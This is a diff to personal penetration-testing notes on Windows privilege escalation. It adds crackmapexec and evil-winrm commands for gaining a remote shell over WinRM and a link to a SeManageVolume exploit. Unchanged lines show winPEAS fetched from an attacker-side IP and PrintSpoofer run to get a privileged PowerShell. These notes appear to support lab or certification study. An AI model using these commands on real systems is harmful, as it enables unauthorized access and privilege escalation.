@@ -43,7 +43,10 @@
 
 ## Auto tool 
 ### evil-winrm
+- port 5985 remote management port
 - connecting to victim get full shell for memory inject / other nasty shit
+- Check if vulnable ``` crackmapexec winrm {ip} -u {username} -p "{password}" -d {domain} ```
+- ``` evil-winrm -i {ip} -u {username not service name} -p "{password}" ```
 ### Winpeas (may be info not correct)
 - Get file from remote ``` iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe ```
   
@@ -55,7 +58,7 @@
 - May require RDP to use
 - ``` Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} ``` get WMI (Windows Management Instrumentation)services and see starting path
 - check if have customed path ``` --default-files```
-- Check permission with ``` icacls {path} ```
+- [*Useful*] Check permission with ``` icacls {path} ```
 - Mask 	Permissions
     F 	Full access
     M 	Modify access
@@ -171,7 +174,7 @@
 ### printspoofer
 -  If ```whoami /priv``` shows ``` SeImpersonatePrivlege``` enabled = can use 
 -   ``` .\PrintSpoofer64.exe -i -c powershell.exe ```
--   
+-  ``` SeManageVolume``` : https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
 
 # Struggling point
 - may need one user jump to another and then jump to another and still not priviledged
